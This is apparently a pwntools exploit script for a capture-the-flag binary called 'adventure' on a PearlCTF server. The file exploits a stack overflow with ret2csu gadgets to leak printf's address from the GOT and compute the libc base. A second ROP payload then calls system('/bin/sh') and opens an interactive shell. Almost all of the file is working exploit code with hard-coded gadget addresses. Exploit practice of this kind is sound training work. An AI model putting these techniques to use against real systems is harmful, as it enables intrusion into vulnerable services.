#!/usr/bin/env python3

from pwn import *

# use "-l 500" with splitmind
context.terminal = ["tmux", "splitw", "-h", "-l 500"]

exe = ELF("adventure_patched")
libc = ELF("libc6_2.35-0ubuntu3_amd64.so")
ld = ELF("./ld-2.35.so")
context.binary = exe

host = "dyn.ctf.pearlctf.in"
port = 30014

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# shortcut lambda
info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)
# --- end ---

# functions
def ret2csu(got_entry: int, edi: int, rsi: int, rdx: int, rbp: int, return_address: int):
    ret = p64(0)                # skip first 8 bytes
    ret += p64(0)              # rbx
    ret += p64(rbp)            # rbp
    ret += p64(edi)            # r12
    ret += p64(rdx)            # r13
    ret += p64(rsi)            # r14
    ret += p64(got_entry)      # r15
    ret += p64(return_address) # ret
    return ret
# --- end functions ---

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
start
bp 0x401267
c
'''.format(**locals())

io = start()

# --- good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :) ---

sla(b"Enter your choice: ", b"2")
sla(b"2. No\n", b"1")

csu_pop = 0x401866
# .text:0000000000401866                 add     rsp, 8
# .text:000000000040186A                 pop     rbx
# .text:000000000040186B                 pop     rbp
# .text:000000000040186C                 pop     r12
# .text:000000000040186E                 pop     r13
# .text:0000000000401870                 pop     r14
# .text:0000000000401872                 pop     r15
# .text:0000000000401874                 retn

csu_call = 0x401850
# .text:0000000000401850                 mov     rdx, r14
# .text:0000000000401853                 mov     rsi, r13
# .text:0000000000401856                 mov     edi, r12d
# .text:0000000000401859                 call    ds:(__frame_dummy_init_array_entry - 403E10h)[r15+rbx*8]
# .text:000000000040185D                 add     rbx, 1
# .text:0000000000401861                 cmp     rbp, rbx
# .text:0000000000401864                 jnz     short loc_401850
# ...
# csu_pop

ret = 0x000000000040101a

padding = b"a"*0x20

payload = flat(
    padding,
    p64(0), #saved rbp
    p64(csu_pop), # saved ret address
    ret2csu(exe.got['puts'], exe.got['printf'], 0, 0, 1, csu_call),
    ret2csu(0, 0, 0, 0, 1, ret),
    p64(exe.sym['main'])
)

sla(b"Give the baby dragon a name", payload)

io.recvuntil(b"You leave the area with aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n")
leaked_libc = u64(io.recvline()[:-1].ljust(8, b"\x00"))
libc.address = leaked_libc - libc.sym['printf']
success(f"libc.address: {hex(libc.address)}")

sla(b"Enter your choice: ", b"2")
sla(b"2. No\n", b"1")

poprdi = 0x000000000040121e


payload = flat(
    padding,
    p64(0), # saved rbp
    p64(poprdi), 
    p64(next(libc.search(b'/bin/sh\x00'))),
    p64(ret),
    p64(libc.sym['system'])
    )

sla(b"Give the baby dragon a name", payload)
io.interactive()

